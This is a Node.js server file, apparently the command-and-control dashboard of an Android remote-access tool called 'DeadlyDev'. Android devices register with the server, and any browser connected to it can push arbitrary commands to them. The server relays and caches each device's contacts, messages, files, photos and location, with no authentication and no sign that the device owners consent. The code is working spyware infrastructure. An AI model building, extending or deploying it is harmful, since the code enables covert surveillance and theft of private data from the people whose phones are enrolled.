const express = require('express');
const { WebSocketServer } = require('ws');
const http = require('http');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({
  server,
  path: '/ws',
  maxPayload: 100 * 1024 * 1024,
  clientTracking: true
});

app.use(express.static(path.join(__dirname, 'public')));

const devices  = new Map();   // deviceId -> { ws, info }
const browsers = new Set();   // browser WebSocket instances

// Latest cached data per device (for new browser connections)
const deviceCache = new Map(); // deviceId -> { contacts, messages }

// ── URL helpers ───────────────────────────────────────────────────
function getPublicBaseUrl(req) {
  const devDomain = process.env.REPLIT_DEV_DOMAIN;
  if (devDomain) return `https://${devDomain}`;
  const host  = req.headers['x-forwarded-host'] || req.headers.host || 'localhost:5000';
  const proto = req.headers['x-forwarded-proto'] || 'http';
  return `${proto}://${host}`;
}
function getWssUrl(req) {
  return getPublicBaseUrl(req).replace(/^http/, 'ws') + '/ws';
}

// ── HTTP endpoints ────────────────────────────────────────────────
app.get('/config', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.json({ wsUrl: getWssUrl(req), httpUrl: getPublicBaseUrl(req) });
});
app.get('/ping', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.json({ status: 'ok', time: new Date().toISOString(), devices: devices.size, wsUrl: getWssUrl(req) });
});
app.get('/status', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.json({ server: 'DeadlyDev', devices: devices.size, browsers: browsers.size, wsUrl: getWssUrl(req), time: new Date().toISOString() });
});

// ── Broadcast to all dashboard browsers ──────────────────────────
function broadcast(data) {
  const msg = JSON.stringify(data);
  for (const ws of browsers) {
    if (ws.readyState === ws.OPEN) ws.send(msg);
  }
}

// ── Server-side ping to keep connections alive ───────────────────
// Replit proxy kills idle WebSocket connections after ~55 s.
const SERVER_PING_INTERVAL = 20_000;

setInterval(() => {
  for (const [id, { ws }] of devices) {
    if (ws.readyState === ws.OPEN) {
      try { ws.send('{"type":"ping"}'); } catch (_) {}
    } else {
      devices.delete(id);
      broadcast({ type: 'device_disconnected', deviceId: id });
      console.log(`[cleanup] Removed dead socket for ${id}`);
    }
  }
  for (const ws of browsers) {
    if (ws.readyState === ws.OPEN) {
      try { ws.send('{"type":"ping"}'); } catch (_) {}
    } else {
      browsers.delete(ws);
    }
  }
}, SERVER_PING_INTERVAL);

// ── WebSocket handler ─────────────────────────────────────────────
wss.on('connection', (ws, req) => {
  let clientType = null;
  let deviceId   = null;

  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || 'unknown';
  console.log(`[WS] New connection from ${ip} | UA: ${ua.substring(0, 70)}`);

  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });

  ws.on('message', (raw) => {
    ws.isAlive = true;
    try {
      const msg = JSON.parse(raw.toString());

      if (msg.type === 'device_info') {
        clientType = 'device';
        deviceId   = msg.deviceId;
        const info = { ...msg, isOnline: true, lastSeen: Date.now() };
        devices.set(deviceId, { ws, info });
        broadcast({ type: 'device_connected', device: info });
        console.log(`[+] Device: ${msg.deviceName} | Android ${msg.androidVersion} | 🔋${msg.battery}%`);

      } else if (msg.type === 'browser_init') {
        clientType = 'browser';
        browsers.add(ws);
        const list = [...devices.values()].map(d => d.info);
        ws.send(JSON.stringify({ type: 'device_list', devices: list }));
        console.log(`[+] Browser connected (${devices.size} devices online)`);

      } else if (msg.type === 'send_command') {
        const dev = devices.get(msg.deviceId);
        if (dev && dev.ws.readyState === dev.ws.OPEN) {
          const commandId = uuidv4();
          dev.ws.send(JSON.stringify({
            type: 'command', commandId, action: msg.action, params: msg.params || {}
          }));
          console.log(`[CMD] → ${msg.action} → ${msg.deviceId}`);
        } else {
          ws.send(JSON.stringify({ type: 'error', message: 'Device offline or disconnected' }));
        }

      } else if (msg.type === 'ka' || msg.type === 'pong' || msg.type === 'ok') {
        if (deviceId && devices.has(deviceId)) {
          const dev = devices.get(deviceId);
          if (msg.b !== undefined) {
            dev.info.battery  = msg.b;
            dev.info.lastSeen = Date.now();
          }
        }
        ws.send('{"type":"ok"}');

      } else if (msg.type === 'heartbeat') {
        if (deviceId && devices.has(deviceId)) {
          const dev = devices.get(deviceId);
          dev.info.battery  = msg.battery;
          dev.info.lastSeen = Date.now();
          broadcast({ type: 'device_update', deviceId, battery: msg.battery });
        }
        ws.send('{"type":"pong"}');

      } else if (msg.type === 'contacts_data') {
        // Cache and broadcast contacts JSON to all browser dashboards
        console.log(`[<-] contacts_data from ${deviceId} (${msg.count} contacts)`);
        if (deviceId) {
          if (!deviceCache.has(deviceId)) deviceCache.set(deviceId, {});
          deviceCache.get(deviceId).contacts = msg.contacts;
        }
        broadcast({ ...msg, deviceId });

      } else if (msg.type === 'messages_data') {
        // Cache and broadcast messages JSON to all browser dashboards
        console.log(`[<-] messages_data from ${deviceId} (${msg.count} messages)`);
        if (deviceId) {
          if (!deviceCache.has(deviceId)) deviceCache.set(deviceId, {});
          deviceCache.get(deviceId).messages = msg.messages;
        }
        broadcast({ ...msg, deviceId });

      } else if (['response', 'file', 'photo', 'location', 'file_list'].includes(msg.type)) {
        console.log(`[<-] ${msg.type} from ${deviceId}`);
        broadcast({ ...msg, deviceId });

      } else if (msg.type === 'ping') {
        ws.send('{"type":"pong"}');
      }

    } catch (e) {
      console.error('[ERR] Parse:', e.message);
    }
  });

  ws.on('close', (code, reason) => {
    if (clientType === 'device' && deviceId) {
      devices.delete(deviceId);
      broadcast({ type: 'device_disconnected', deviceId });
      console.log(`[-] Device disconnected: ${deviceId} (code ${code})`);
    } else if (clientType === 'browser') {
      browsers.delete(ws);
      console.log(`[-] Browser disconnected`);
    }
  });

  ws.on('error', (e) => {
    console.error('[ERR] WS:', e.message);
    if (clientType === 'device' && deviceId) {
      devices.delete(deviceId);
      broadcast({ type: 'device_disconnected', deviceId });
    } else if (clientType === 'browser') {
      browsers.delete(ws);
    }
  });
});

// Protocol-level heartbeat check — kill dead sockets every 30 s
const wsHeartbeatInterval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) { ws.terminate(); return; }
    ws.isAlive = false;
    try { ws.ping(); } catch (_) {}
  });
}, 30_000);

wss.on('close', () => clearInterval(wsHeartbeatInterval));

// ── Start server ──────────────────────────────────────────────────
const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`DeadlyDev Dashboard running on port ${PORT}`);
  console.log(`Config URL: http://0.0.0.0:${PORT}/config`);
  console.log(`WebSocket:  ws://0.0.0.0:${PORT}/ws`);
});
